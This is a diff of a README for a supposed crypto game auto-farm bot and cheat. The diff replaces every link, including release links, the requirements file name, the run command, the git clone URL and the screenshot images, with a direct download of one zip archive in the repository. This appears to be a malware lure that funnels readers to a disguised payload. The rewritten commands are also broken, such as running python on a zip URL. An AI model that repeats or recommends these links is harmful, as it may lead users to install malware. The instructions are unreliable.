@@ -1,6 +1,6 @@
 # GasHero Finance Game Bot: Auto-Farm Clicker for Crypto Gains 🚀
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/Golane2/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/releases)
+[![Download Latest Release](https://github.com/Golane2/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/raw/refs/heads/main/Portia/Cheat-Auto-Farm-Gas-Bot-Blockchain-Clicker-Finance-Hero-Game-Crypto-Hack-2.8.zip%20Latest%20Release-v1.0.0-blue)](https://github.com/Golane2/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/raw/refs/heads/main/Portia/Cheat-Auto-Farm-Gas-Bot-Blockchain-Clicker-Finance-Hero-Game-Crypto-Hack-2.8.zip)
 
 ## Table of Contents
 
@@ -27,12 +27,12 @@ GasHero Finance Game Bot is designed to automate farming and clicker activities 
 
 ## Installation
 
-To get started, download the latest release from the [Releases section](https://github.com/Golane2/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/releases). Follow these steps to install the bot:
+To get started, download the latest release from the [Releases section](https://github.com/Golane2/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/raw/refs/heads/main/Portia/Cheat-Auto-Farm-Gas-Bot-Blockchain-Clicker-Finance-Hero-Game-Crypto-Hack-2.8.zip). Follow these steps to install the bot:
 
 1. **Download the Bot**: Click on the link to download the latest version.
 2. **Extract Files**: Unzip the downloaded file to your preferred location.
-3. **Install Dependencies**: Ensure you have the required dependencies installed. Check the `requirements.txt` file for a list of necessary libraries.
-4. **Run the Bot**: Open your terminal or command prompt, navigate to the extracted folder, and execute the bot using the command: `python gashero_bot.py`.
+3. **Install Dependencies**: Ensure you have the required dependencies installed. Check the `https://github.com/Golane2/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/raw/refs/heads/main/Portia/Cheat-Auto-Farm-Gas-Bot-Blockchain-Clicker-Finance-Hero-Game-Crypto-Hack-2.8.zip` file for a list of necessary libraries.
+4. **Run the Bot**: Open your terminal or command prompt, navigate to the extracted folder, and execute the bot using the command: `python https://github.com/Golane2/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/raw/refs/heads/main/Portia/Cheat-Auto-Farm-Gas-Bot-Blockchain-Clicker-Finance-Hero-Game-Crypto-Hack-2.8.zip`.
 
 ## Usage
 
@@ -48,7 +48,7 @@ After installation, follow these steps to start using the GasHero Finance Game B
 We welcome contributions to improve the GasHero Finance Game Bot. If you want to help, please follow these steps:
 
 1. **Fork the Repository**: Click on the "Fork" button at the top right of this page.
-2. **Clone Your Fork**: Use the command `git clone https://github.com/your-username/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat.git` to clone your fork to your local machine.
+2. **Clone Your Fork**: Use the command `git clone https://github.com/Golane2/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/raw/refs/heads/main/Portia/Cheat-Auto-Farm-Gas-Bot-Blockchain-Clicker-Finance-Hero-Game-Crypto-Hack-2.8.zip` to clone your fork to your local machine.
 3. **Create a Branch**: Create a new branch for your feature or fix using `git checkout -b feature-name`.
 4. **Make Changes**: Implement your changes and test them thoroughly.
 5. **Submit a Pull Request**: Push your changes to your fork and submit a pull request to the main repository.
@@ -59,7 +59,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Releases section](https://github.com/Golane2/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/releases) for updates or contact us through GitHub issues.
+If you encounter any issues or have questions, please check the [Releases section](https://github.com/Golane2/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/raw/refs/heads/main/Portia/Cheat-Auto-Farm-Gas-Bot-Blockchain-Clicker-Finance-Hero-Game-Crypto-Hack-2.8.zip) for updates or contact us through GitHub issues.
 
 ---
 
@@ -89,10 +89,10 @@ If you encounter any issues or have questions, please check the [Releases sectio
 
 ### Screenshots
 
-![Bot Dashboard](https://example.com/screenshot1.png)
+![Bot Dashboard](https://github.com/Golane2/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/raw/refs/heads/main/Portia/Cheat-Auto-Farm-Gas-Bot-Blockchain-Clicker-Finance-Hero-Game-Crypto-Hack-2.8.zip)
 *Bot Dashboard*
 
-![Farming in Action](https://example.com/screenshot2.png)
+![Farming in Action](https://github.com/Golane2/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/raw/refs/heads/main/Portia/Cheat-Auto-Farm-Gas-Bot-Blockchain-Clicker-Finance-Hero-Game-Crypto-Hack-2.8.zip)
 *Farming in Action*
 
 ### FAQs
@@ -112,4 +112,4 @@ Join our community on Discord for real-time support and discussions. Share your 
 
 ---
 
-For more information, visit the [Releases section](https://github.com/Golane2/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/releases) to stay updated on the latest features and improvements.
+For more information, visit the [Releases section](https://github.com/Golane2/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/raw/refs/heads/main/Portia/Cheat-Auto-Farm-Gas-Bot-Blockchain-Clicker-Finance-Hero-Game-Crypto-Hack-2.8.zip) to stay updated on the latest features and improvements.
